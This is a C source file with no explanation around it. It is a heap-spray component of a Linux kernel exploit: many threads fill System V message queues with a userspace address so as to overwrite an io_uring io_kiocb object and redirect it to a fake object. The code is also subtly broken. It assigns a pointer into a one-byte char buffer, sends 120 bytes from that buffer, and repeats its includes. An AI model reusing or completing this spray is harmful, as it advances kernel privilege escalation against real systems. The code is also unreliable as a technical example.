#include <sys/xattr.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <pthread.h>
#include <inttypes.h>
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h>

// This can overwrite the io_kiocb but we don't control offset +0x18
// #define CONTENT_LEN ((96 - 60 - 24))

#define CONTENT_LEN 120

#define NUM_WORKERS 120

#define MSGS_PER_WORKER 30

// Where is the fake object located in userspace
// In the context of the future exploit process that is
// #define BOUNCE_ADDR 0x4141414141410000ULL
#define BOUNCE_ADDR 0x30000000ul

typedef struct msgbuf {
	long mtype;
	char mtext[1];
} msgbuf;


int worker() {
	int retval;
	uint64_t content[CONTENT_LEN >> 3];
	for (int i = 0; i < CONTENT_LEN >> 3; i++) {
		content[i] = BOUNCE_ADDR;
	}
	msgbuf b;
	b.mtype = 1;
	b.mtext[0] = content;
	int id = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	for (int i = 0; i < MSGS_PER_WORKER; i++) {
		retval = msgsnd(id, &b, CONTENT_LEN, 0);

		if (retval < 0) {
			perror("msgsnd\n");
			exit(EXIT_FAILURE);
		}
	}

	sleep(4);

	for (int i = 0; i < MSGS_PER_WORKER; i++) {
		msgrcv(id, &b, CONTENT_LEN, 0, 0);
	}
}

int main() {
	static pthread_t threads[NUM_WORKERS];
	for (int i = 0; i < NUM_WORKERS; i++) {
		pthread_create(&threads[i], NULL, &worker, 0);
	}

	// for (int i = 0; i < NUM_WORKERS; i++) {
	// 	pthread_join(&threads[i], NULL);
	// }
	sleep(5);
}